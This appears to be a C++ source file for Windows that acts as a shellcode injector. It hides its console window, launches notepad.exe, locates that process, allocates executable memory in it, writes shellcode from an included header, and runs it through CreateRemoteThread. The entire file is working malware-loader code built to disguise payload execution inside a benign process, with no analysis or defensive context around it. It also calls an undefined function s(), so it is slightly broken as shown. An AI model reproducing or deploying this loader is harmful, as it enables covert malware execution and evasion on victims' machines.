#include <string>
#include <iostream>
#include <psapi.h>
#include <windows.h>
#include <stdio.h>
#include "shellcode.h"
#include "resource.h"


void hide_terminal()
{
	HWND s;
	AllocConsole();
	s = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(s, 0);
}

int findPID(const char* processName) {
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	unsigned int i;

	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
	{
		return 0;
	}
	cProcesses = cbNeeded / sizeof(DWORD);

	for (i = 0; i < cProcesses; i++) {
		if (aProcesses[i] != 0) {
			HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);

			if (hProcess != NULL) {
				HMODULE hMod;
				DWORD cbNeeded;

				if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
					char szProcessName[MAX_PATH];

					if (GetModuleBaseNameA(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(char))) {

						if (strcmp(szProcessName, processName) == 0) {
							return aProcesses[i];
						}
					}
				}
			}
		}
	}
	return 0;
}

bool spawn_notepad()
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);
	si.wShowWindow = SW_NORMAL;
	WCHAR cmdLine[MAX_PATH];
	wcscpy_s(cmdLine, MAX_PATH, L"notepad.exe");
	if (!CreateProcess(NULL, cmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
	{
		return 0;
	}
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	return 1;
}

int main(int argc, char* argv[])
{
		s();
		SIZE_T shellSize = sizeof(shellcode);
		HANDLE processHandle;
		HANDLE remoteThread;
		LPVOID exec_mem;

		bool notepad_verify = spawn_notepad();
		if (notepad_verify == 0) {
			return 0;
		}

		int PID = findPID("notepad.exe");
		if (PID == 0) {
			return 0;
		}
		processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
		if (processHandle == NULL) {
			return 0;
		}
		exec_mem = VirtualAllocEx(processHandle, NULL, shellSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (exec_mem == NULL) {
			return 0;
		}
		WriteProcessMemory(processHandle, exec_mem, shellcode, shellSize, NULL);
		remoteThread = CreateRemoteThread(processHandle, NULL, NULL, (LPTHREAD_START_ROUTINE)exec_mem, NULL, NULL, NULL);
		if (remoteThread == NULL) {
			return 0;
		}

		WaitForSingleObject(remoteThread, INFINITE);
		CloseHandle(processHandle);
		CloseHandle(remoteThread);

		return 1;
}